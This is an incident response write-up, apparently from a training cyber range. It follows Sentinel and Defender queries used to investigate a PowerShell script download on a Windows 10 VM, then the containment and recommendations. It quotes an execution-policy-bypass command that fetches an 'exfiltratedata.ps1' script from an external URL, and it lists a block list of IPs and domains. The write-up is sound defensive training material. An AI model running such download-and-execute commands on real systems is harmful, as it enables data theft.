# Incident Response Scenario: Detect Web-Request from Powershell

## Platforms and Tools Used
- Windows 10 Virtual Machines (Microsoft Azure)
- Microsoft Sentinel
- Endpoint Detection and Response (EDR): Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)

---

## Detection and Analysis

### Initial Alert

The investigation started with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN." The alert was triggered by this query:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

![ir1](https://github.com/user-attachments/assets/1fab327c-eb1c-465a-99d7-83ac5688ca46)

The query flagged the following suspicious command:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

This command showed that a PowerShell script (exfiltratedata.ps1) was downloaded from the internet and saved to `C:\programdata`, which prompted further investigation.

### Relevant MITRE ATT&CK Techniques
- **T1059.001**: Command and Scripting Interpreter: PowerShell
- **T1105**: Ingress Tool Transfer
- **T1027**: Obfuscated Files or Information

### User Inquiry

I spoke with the user of `ir-win10` to get some context. They mentioned trying to install something, seeing a black screen, and thinking "nothing happened." From this, it seemed likely they unknowingly ran a malicious script.

### Process Events Analysis

To verify if the script ran and identify any follow-up malicious actions, I checked process events with this query:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| project Timestamp, FileName, FolderPath, ProcessCommandLine
| order by Timestamp
```

![processquery](https://github.com/user-attachments/assets/e9197ad7-2365-4bbc-86fb-41a25c40ff57)

**Findings:**

The logs confirmed these events:
1. The script `exfiltratedata.ps1` was downloaded and executed multiple times.
2. A silent installation of 7-Zip using `7z2408-x64.exe` was carried out.
3. 7-Zip was then used to compress sensitive data into ZIP files.

This sequence strongly suggested malicious intent to exfiltrate sensitive information.

### Network Events Analysis

To check for data exfiltration, I queried network events:

```kql
DeviceNetworkEvents
| where DeviceName == "ir-win10"
| project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp
```

![networkquery](https://github.com/user-attachments/assets/6fccbaf5-f771-4ba9-9805-e0baed7ed3de)

**Findings:**

The logs revealed repeated connections to external endpoints, indicating potential data exfiltration.

### File Events Analysis

Finally, I checked file events to locate evidence of data staging or exfiltration:

```kql
DeviceFileEvents
| where DeviceName == "ir-win10"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
| order by Timestamp desc
```

![Filequery](https://github.com/user-attachments/assets/aba14b2e-9fbd-41aa-a33d-bfe771693a61)

**Findings:**

The repeated creation and renaming of ZIP files matched a pattern of staging files for exfiltration.

---

## Containment, Eradication, and Recovery

### Immediate Containment

1. **Quarantine the Affected Device:**
   - `ir-win10` was isolated from the network using Defender for Endpoint.

2. **Block Malicious IPs and URLs:**
   - Blocked these IPs and domains:
     - `185.199.109.133`
     - `20.60.181.193`
     - `20.60.133.132`
     - `https://raw.githubusercontent.com`
     - `https://sacyberrange00.blob.core.windows.net`
     - `https://sacyberrangedanger.blob.core.windows.net`

### Investigation and Remediation

1. **Remove Malicious Files:**
   - Deleted all instances of `exfiltratedata.ps1` and any related ZIP files.

2. **Scan the System:**
   - Performed a full system scan with Microsoft Defender for Endpoint.

3. **Review Network Traffic:**
   - Checked logs to confirm no sensitive data was successfully exfiltrated.

4. **Improve Endpoint Security:**
   - Disabled PowerShell for non-administrative users.
   - Tightened PowerShell execution policies.
   - Added application whitelisting to block unauthorized executables.

---

## Post-Incident Activities

### Recommendations

1. **Enhance Monitoring:**
   - PowerShell activity logging is already in place, as seen from this alert. However, detection rules for unauthorized archiving tools and large file transfers should be added.

2. **Educate Users:**
   - Train employees to recognize suspicious activity and follow company policies for running scripts.

3. **Document Findings:**
   - Record findings and update the incident response playbook with lessons learned.

### Post-Incident Monitoring

- Keep ir-win10 under close monitoring post-remediation.
- Perform network-wide scans to ensure no other devices are compromised.

---

## Closure

This incident was effectively handled, contained, eradicated, and resolved. Documentation has been updated, and the lessons learned have been integrated into our response playbook to strengthen future readiness.


